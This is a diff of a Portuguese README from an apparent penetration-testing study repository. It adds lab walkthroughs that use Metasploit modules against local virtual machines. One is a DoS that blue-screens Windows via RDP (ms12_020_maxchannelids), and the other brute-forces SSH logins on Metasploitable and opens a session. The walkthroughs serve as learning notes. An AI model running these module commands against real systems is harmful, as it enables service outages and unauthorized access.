@@ -19,7 +19,7 @@ Para realização dos estudos, utilizei o **mfsconsole**
 Abaixo, todos os casos de estudo:
 - [EXPLORANDO FALHAS NO FTP](#explorando-falhas-no-ftp)
 - [ATAQUES DOS NO WINDOWS RDP](#ataques-dos-no-windows-rdp)
-- [EXPLORANDO FALHAS NO SSH](#explorando-falhas-no-ssh)
+- [EXPLORANDO FALHAS NO SSH COM FORCA BRUTA](#explorando-falhas-no-ssh-com-forca-bruta)
 - [ADICIONANDO BACKDOOR EM UM EXECUTÁVEL](#adicionando-backdoor-em-um-executavel)
 
 ---
@@ -48,12 +48,55 @@ E assim, estamos com acesso ao alvo, via terminal.
 ---
 
 ## ATAQUES DOS NO WINDOWS RDP
-...
+**RDP(Remote Desktop Protocol)** é um protocolo desenvolvido pela Microsoft que permite que um usuário se conecte remotamente a outro computador ou servidor por meio de uma interface gráfica.  
+Ele utiliza a porta 3389, TCP ou UDP.  
+Este ataque DOS pode causar a interrupção de um serviço ou o travamento de um servidor Windows ao explorar o limite de IDs de canal no RDP.  
+#### Simulação de ataque: causar tela azul no Windows.
+Liguiei as máquinas virtuais do Windows XP e do Kali Linux.  
+No Windows XP precisamos ativar o "remote desktop", através do Painle de Controle.
+Pegar o ip do Windows 7 no CMD.  
+Acessar o `mfsconsole` no Kali, a partir do modo `sudo su`.  
+`search rdp` = procuramos os modulos disponíveis.  
+Usaremos o módulo `use auxiliary/dos/windows/rdp/ms12_020_maxchannelids`.  
+`show options` = pra verificar os requerimentos a serem definidos no módulo
+`set rhosts 192.168.56.105` = definimos o IP do alvo.  
+`run`  
+Ataque bem sucedido, tela azul no Windows.  
+![unnamed](https://github.com/user-attachments/assets/c94aeeca-346c-402c-a9a8-69665fd2e1dc)
 
 ---
 
-## EXPLORANDO FALHAS NO SSH
-...
+## EXPLORANDO FALHAS NO SSH COM FROCA BRUTA
+**SSH (Secure Shell)** é um protocolo de rede criptografado que permite a comunicação segura entre dois computadores.  
+Por padrão, o servidor SSH escuta a porta 22.  
+Para este ataque, utilizaremos o *Metasploitable* como alvo.  
+Utilizaremos a técnica de *“Força Bruta”* para conseguir acesso ao servidor.  
+Primeiramente, iniciamos as VM’s do *Kali* e do *Metasploitable*.  
+No Kali, abrimos o console e seguimos os passos:  
+- `msfconsole`
+- `search ssh_login` = procuramos o módulo a ser utilizado
+- `use auxiliary/scanner/ssh/ssh_login` = usaremos este módulo
+- `info` = para verificar os requerimentos
+- Neste caso, precisaremos definir, além do IP do alvo, dois arquivos que contenham informações de usuários e senhas.
+- As informações contidas nestes arquivos, serão utilizadas para o ataque de força bruta.
+- Sabemos que usuário e senha do Metasploitable são *“msfadmin”*.
+- Então criei dois arquivos no Kali: *user.txt* e *password.txt*.
+- Em ambos, devemos colocar uma “opção” por linha.
+- Em ambos arquivos, pode-se colocar qualquer nomes para teste, mas devem conter também a informação correta em qualquer uma das linhas.
+- Agora, definimos as informações necessárias:  
+`set rhosts 192.168.56.101` = este é o IP do Mestasploitable  
+`set USER_FILE /home/kali/user.txt` = arquivo com possíveis usuários  
+`set PASS_FILE /home/kali/password.txt` = arquivo com possíveis senhas  
+`exploit`  
+
+
+Agora que o ataque foi bem sucedido, vamos confirmar as sessões abertas.  
+`sessions` = vemos que existe uma sessão aberta  
+`sessions 1` = acessamos a sessão  
+Agora já estamos dentro do alvo, e digitamos o comando `ip addr` pra confirmar.  
+Neste caso, o IP já é o do Metasploitable.  
+![unnamed](https://github.com/user-attachments/assets/e1266107-6adc-4bc9-b5ff-72492951eaa0)
+
 
 ---
 
